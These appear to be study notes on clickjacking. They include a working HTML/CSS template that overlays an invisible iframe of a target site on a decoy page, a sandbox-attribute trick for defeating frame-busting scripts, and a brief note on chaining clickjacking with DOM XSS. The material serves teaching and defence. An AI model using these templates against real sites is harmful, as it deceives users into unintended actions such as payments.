## What is clickjacking?

- interface-based attack in which a user is tricked into clicking on actionable content on a hidden website by clicking on some other content in a decoy website

- eg - web user accesses a decoy website > clicks on a button to win a price > unknowingly, they have been deceived by an attacker into pressing an alternative hidden button > results in payment of an account on another site

- user is required to perform an action such as a button click whereas CSRF attack depends upon forging an entire request without the user's knowledge or input

## How to construct a basic clickjacking attack

```html
<head>
  <style>
    #target_website {
      position: relative;
      width: 128px;
      height: 128px;
      opacity: 0.00001;
      z-index: 2;
    }
    #decoy_website {
      position: absolute;
      width: 300px;
      height: 400px;
      z-index: 1;
    }
  </style>
</head>
...
<body>
  <div id="decoy_website">
    <!-- ...decoy web site content here... -->
  </div>
  <iframe id="target_website" src="https://vulnerable-website.com"></iframe>
</body>
```

## Frame busting scripts

- common client-side protection enacted through the web browser is to use frame busting or frame breaking scripts
- can be implemented via proprietary browser JS add-ons or extensions such as NoScripts
- Scripts perform some or all of the following behaviors:

  - check and enforce that the current application window is the main or top window
  - make all frames visible
  - prevent clicking on invisible frames
  - intercept and flag potential clickjacking attacks to the user

- effective attacker workaround against frame busters is to use the HTML5 iframe sandbox attribute: `allow-forms` or `allow-scripts` values

```html
<iframe
  id="victim_website"
  src="https://victim_site.com"
  sandbox="allow-forms"
></iframe>
```

## Combining clickjacking with a DOM XSS attack

- implementation of this combined attack is straightforward assuming that the attacker has first identified the XSS exploit
- XSS exploit is then combined with the iframe target URL so that the user clicks on the button or link and executes the DOM XSS attack
